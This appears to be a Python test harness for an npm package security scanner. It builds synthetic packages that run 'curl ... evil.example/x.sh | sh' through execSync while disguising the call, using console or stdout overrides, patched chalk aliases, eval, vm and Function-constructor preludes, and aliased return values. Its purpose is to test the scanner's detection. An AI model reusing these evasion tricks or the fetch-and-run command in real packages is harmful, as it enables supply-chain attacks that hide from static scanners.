"""Adversarial recall cases for #185 (printed-hint relaxations). Run from a repo export."""
import io
import json
import sys
import tarfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from scripts.corpus import run_static_corpus as rsc  # noqa: E402
from src.scanner.artifact_fetch import npm_result_from_tarball  # noqa: E402
from src.scanner.scan import (  # noqa: E402
    ScanResult,
    _calculate_category_scores,
    _calculate_trust_score,
    _certified_status,
    apply_artifact_scan,
)

CMD = "curl -fsSL https://evil.example/x.sh | sh"
Q = json.dumps(CMD)
FILL = "".join(f"function helper{i}(a, b) {{ return a + b + {i}; }}\n" for i in range(14000))


def tgz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for p, text in files.items():
            d = text.encode()
            ti = tarfile.TarInfo("package/" + p)
            ti.size = len(d)
            tf.addfile(ti, io.BytesIO(d))
    return buf.getvalue()


def pkg(files, main="index.js"):
    out = {"package.json": json.dumps({"name": "adv-case", "version": "1.0.0", "main": main,
                                       "bin": {"adv": main}})}
    out.update(files)
    return out


CP = "const { execSync } = require('child_process');\n"
A_HEAD = "const { source_default } = require('./chunk-a');\n"
CASES = {
    # controls
    "ctl_plain_hint": pkg({"index.js": f"console.log('Install: ' + {Q});\n"}),
    "ctl_direct_exec": pkg({"index.js": CP + f"execSync({Q});\n"}),
    "ctl_chalk_alias_real": pkg({
        "chunk-a.js": "var chalk = require('chalk');\nvar source_default = chalk;\n"
                      "module.exports = { source_default };\n",
        "index.js": A_HEAD + f"console.log(source_default.bold({Q}));\n"}),
    # (a) line-0 / tail window
    "a_tail_print_then_exec": pkg({"index.js": CP + FILL + f"console.log({Q});\nexecSync({Q});\n"}),
    "a_tail_exec_then_print": pkg({"index.js": CP + FILL + f"execSync({Q});\nconsole.log({Q});\n"}),
    "a_tail_two_vars": pkg({"index.js": CP + FILL +
                            f"const HINT = {Q};\nconsole.log(HINT);\nconst HINT2 = {Q};\n"
                            "execSync(HINT2);\n"}),
    "a_tail_same_line_both": pkg({"index.js": CP + FILL +
                                  f"console.log({Q});\nconsole.log({Q}), execSync({Q});\n"}),
    "ctl_tail_print_only": pkg({"index.js": FILL + f"console.log({Q});\n"}),
    "ctl_head_print_only": pkg({"index.js": f"console.log({Q});\n" + FILL}),
    "a_small_print_then_exec": pkg({"index.js": CP + f"console.log({Q});\nexecSync({Q});\n"}),
    "a_tail_print_exec_elsewhere": pkg({
        "index.js": CP + "require('./big');\n" + f"execSync({Q});\n",
        "big.js": FILL + f"console.log({Q});\n"}),
    # (b) chalk alias across chunks
    "b_alias_fake_chalk_obj": pkg({
        "chunk-a.js": "const cp = require('child_process');\nvar chalk = {\n"
                      "  bold: (s) => cp.execSync(s),\n};\n"
                      "var source_default = chalk;\nmodule.exports = { source_default };\n",
        "index.js": A_HEAD + f"source_default.bold({Q});\n"}),
    "b_alias_proxy_multiline": pkg({
        "chunk-a.js": "const cp = require('child_process');\nvar chalk = new\n"
                      "  Proxy({}, { get: () => (s) => cp.execSync(s) });\n"
                      "var source_default = chalk;\nmodule.exports = { source_default };\n",
        "index.js": A_HEAD + f"source_default.bold({Q});\n"}),
    "b_alias_built_elsewhere": pkg({
        "maker.js": "const cp = require('child_process');\n"
                    "module.exports = () => ({ bold: (s) => cp.execSync(s) });\n",
        "chunk-a.js": "const make = require('./maker');\nvar chalk = make();\n"
                      "var source_default = chalk;\nmodule.exports = { source_default };\n",
        "index.js": A_HEAD + f"source_default.bold({Q});\n"}),
    "b_alias_patched_later": pkg({
        "chunk-a.js": "const cp = require('child_process');\nvar chalk = require('chalk');\n"
                      "chalk.bold = (s) => cp.execSync(s);\n"
                      "var source_default = chalk;\nmodule.exports = { source_default };\n",
        "index.js": A_HEAD + f"source_default.bold({Q});\n"}),
    "b_alias_defineprop": pkg({
        "chunk-a.js": "const cp = require('child_process');\nvar chalk = require('chalk');\n"
                      "Object.defineProperty(chalk, 'bold', { value: (s) => cp.execSync(s) });\n"
                      "var source_default = chalk;\nmodule.exports = { source_default };\n",
        "index.js": A_HEAD + f"source_default.bold({Q});\n"}),
    "b_alias_patched_other_file": pkg({
        "chunk-a.js": "var chalk = require('chalk');\nvar source_default = chalk;\n"
                      "module.exports = { source_default };\n",
        "patch.js": "const cp = require('child_process');\n" + A_HEAD +
                    "source_default.bold = (s) => cp.execSync(s);\n",
        "index.js": "require('./patch');\n" + A_HEAD + f"source_default.bold({Q});\n"}),
    "b_alias_assign_other_file": pkg({
        "chunk-a.js": "var chalk = require('chalk');\nvar source_default = chalk;\n"
                      "module.exports = { source_default };\n",
        "patch.js": "const cp = require('child_process');\n" + A_HEAD +
                    "Object.assign(source_default, { bold: (s) => cp.execSync(s) });\n",
        "index.js": "require('./patch');\n" + A_HEAD + f"source_default.bold({Q});\n"}),
    "b_alias_setproto": pkg({
        "chunk-a.js": "const cp = require('child_process');\nvar chalk = require('chalk');\n"
                      "Object.setPrototypeOf(chalk, { bold: (s) => cp.execSync(s) });\n"
                      "var source_default = chalk;\nmodule.exports = { source_default };\n",
        "index.js": A_HEAD + f"source_default.bold({Q});\n"}),
    # (c) console replacement
    "c_console_log_other_file": pkg({
        "setup.js": "const cp = require('child_process');\nconsole.log = (s) => cp.execSync(s);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_console_log_split_lines": pkg({
        "setup.js": "const cp = require('child_process');\nconst run = (s) => cp.execSync(s)\n"
                    "console.log =\n  run\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_console_assign": pkg({
        "setup.js": "const cp = require('child_process');\n"
                    "Object.assign(console, { log: (s) => cp.execSync(s) });\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_console_computed_key": pkg({
        "setup.js": "const cp = require('child_process');\n"
                    "console['lo' + 'g'] = (s) => cp.execSync(s);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_globalthis_console": pkg({
        "setup.js": "const cp = require('child_process');\n"
                    "globalThis.console = { log: (s) => cp.execSync(s) };\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_reflect_set": pkg({
        "setup.js": "const cp = require('child_process');\n"
                    "Reflect.set(console, 'log', (s) => cp.execSync(s));\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_console_alias_var": pkg({
        "setup.js": "const cp = require('child_process');\nconst c = console;\n"
                    "c.log = (s) => cp.execSync(s);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_stdout_write_exec": pkg({
        "setup.js": "const cp = require('child_process');\n"
                    "process.stdout.write = (chunk) => cp.execSync(String(chunk));\n",
        "index.js": f"require('./setup');\nprocess.stdout.write({Q});\n"}),
    "c_stdout_write_alias_exec": pkg({
        "setup.js": "const cp = require('child_process');\nconst raw = cp.execSync;\n"
                    "process.stdout.write = (chunk, enc, cb) => raw(String(chunk), cb);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_stream_alias_rebound": pkg({
        "setup.js": "const cp = require('child_process');\n"
                    "let w = process.stderr.write.bind(process.stderr);\n"
                    "[w] = [cp.execSync];\nprocess.stdout.write = (chunk) => w(String(chunk));\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_stream_alias_objassign": pkg({
        "setup.js": "const cp = require('child_process');\n"
                    "let w = process.stderr.write.bind(process.stderr);\n"
                    "({ w } = { w: cp.execSync });\n"
                    "process.stdout.write = (chunk) => w(String(chunk));\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_new_console_exec_stream": pkg({
        "setup.js": "const { Console } = require('node:console');\n"
                    "const cp = require('child_process');\n"
                    "globalThis.console = new Console({ stdout: { write: (s) => cp.execSync(s) } });\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_prelude_indirect_eval": pkg({
        "setup.js": "const PRELUDE = \"console.log = (s) => require('child_process').execSync(s)\";\n"
                    "function load(src) { return (0, eval)(src); }\nload(PRELUDE);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_prelude_vm_alias": pkg({
        "setup.js": "const vm = require('vm');\nconst go = vm.runInThisContext;\n"
                    "const PRELUDE = \"console.log = (s) => process.mainModule.require("
                    "'child_process').execSync(s)\";\n"
                    "function load(src) { return go(src); }\nload(PRELUDE);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_prelude_fn_ctor": pkg({
        "setup.js": "const PRELUDE = \"console.log = (s) => process.mainModule.require("
                    "'child_process').execSync(s)\";\n"
                    "const F = [].map.constructor;\nfunction load(src) { return F(src)(); }\n"
                    "load(PRELUDE);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    "c_prelude_worker_eval": pkg({
        "setup.js": "const { Worker } = require('worker_threads');\n"
                    "const PRELUDE = \"console.log = (s) => require('child_process').execSync(s)\";\n"
                    "function load(src) { return new Worker(src, { eval: true }); }\n"
                    "load(PRELUDE);\n",
        "index.js": f"require('./setup');\nconsole.log({Q});\n"}),
    # (d) returned / aliased values
    "d_returned_alias_exec": pkg({
        "hint.js": f"function hint() {{ return {Q}; }}\nmodule.exports = {{ hint }};\n",
        "index.js": CP + "const { hint } = require('./hint');\nconsole.log(hint());\n"
                         "const f = hint;\nexecSync(f());\n"}),
    "d_returned_default_export": pkg({
        "hint.js": f"module.exports = function () {{ return {Q}; }};\n",
        "index.js": CP + "const h = require('./hint');\nconsole.log(h());\nexecSync(h());\n"}),
    "d_returned_call": pkg({
        "hint.js": f"function hint() {{ return {Q}; }}\nmodule.exports = {{ hint }};\n",
        "index.js": CP + "const { hint } = require('./hint');\nconsole.log(hint());\n"
                         "execSync(hint.call(null));\n"}),
    "d_returned_computed_member": pkg({
        "hint.js": f"module.exports = {{ hint() {{ return {Q}; }} }};\n",
        "index.js": CP + "const m = require('./hint');\nconsole.log(m.hint());\n"
                         "execSync(m['hi' + 'nt']());\n"}),
    "d_template_derived_exec": pkg({
        "index.js": CP + f"const H = {Q};\nconst msg = `${{H}}`;\nconsole.log(H);\nexecSync(msg);\n"}),
    "d_concat_empty_exec": pkg({
        "index.js": CP + f"const H = {Q};\nconst m = '' + H;\nconsole.log(H);\nexecSync(m);\n"}),
    "d_ternary_alias_exec": pkg({
        "index.js": CP + f"const H = {Q};\nconst m = process.env.X ? H : H;\nconsole.log(H);\n"
                         "execSync(m);\n"}),
    "d_destructure_exec": pkg({
        "index.js": CP + f"const H = {Q};\nconst [m] = [H];\nconsole.log(H);\nexecSync(m);\n"}),
}


# (c2) the same console attacks with the hint exported from another file, so the
# per-file pass (which sees one file) keeps it and only the package walk decides.
for _n in [k for k in CASES if k.startswith("c_")]:
    _f = dict(CASES[_n])
    _uses_stdout = "process.stdout.write(" in _f["index.js"]
    _f["hint.mjs"] = f"export const H = {Q};\n"
    _f.pop("index.js")
    _f["index.mjs"] = ("import './setup.js';\nimport { H } from './hint.mjs';\n"
                       + ("process.stdout.write(H);\n" if _uses_stdout else "console.log(H);\n"))
    _f["package.json"] = _f["package.json"].replace("index.js", "index.mjs")
    CASES["x" + _n] = _f
CASES["xctl_exported_hint"] = pkg({
    "hint.js": f"const H = {Q};\nmodule.exports = {{ H }};\n",
    "index.js": "const { H } = require('./hint');\nconsole.log(H);\n"})
CASES["xctl_esm"] = pkg({
    "hint.mjs": f"export const H = {Q};\n",
    "index.mjs": "import { H } from './hint.mjs';\nconsole.log(H);\n"}, main="index.mjs")
CASES["xctl_exports_dot"] = pkg({
    "hint.js": f"exports.H = {Q};\n",
    "index.js": "const h = require('./hint');\nconsole.log(h.H);\n"})
CASES["xctl_fn_export"] = pkg({
    "hint.js": f"function show() {{ console.log({Q}); }}\nmodule.exports = {{ show }};\n",
    "index.js": "require('./hint').show();\n"})
CASES["xctl_tpl_line"] = pkg({
    "index.js": f"const H = {Q};\nmodule.exports = {{ H }};\nconsole.log(`Run: ${{H}}`);\n"})


def run(files):
    fetched = npm_result_from_tarball("adv-case", "1.0.0", tgz(files))
    r = ScanResult(repo="npm:adv-case", stars=0, description="", framework="")
    apply_artifact_scan(r, "npm", fetched)
    r.trust_score = _calculate_trust_score(r)
    r.category_scores = _calculate_category_scores(r)
    r.certified = _certified_status(r)
    d = rsc.real_decide(r)
    crit = [f for f in r.findings if f.severity == "critical"]
    return d.label, r.trust_score, len(crit), (d.reason or "")[:80]


if __name__ == "__main__":
    only = set(sys.argv[1:])
    for name, files in CASES.items():
        if only and name not in only:
            continue
        try:
            label, score, n, why = run(files)
            print(f"{name:30} {label:15} {score:>3} crit={n} | {why}", flush=True)
        except Exception as e:  # noqa: BLE001
            print(f"{name:30} ERROR {type(e).__name__}: {str(e)[:100]}", flush=True)
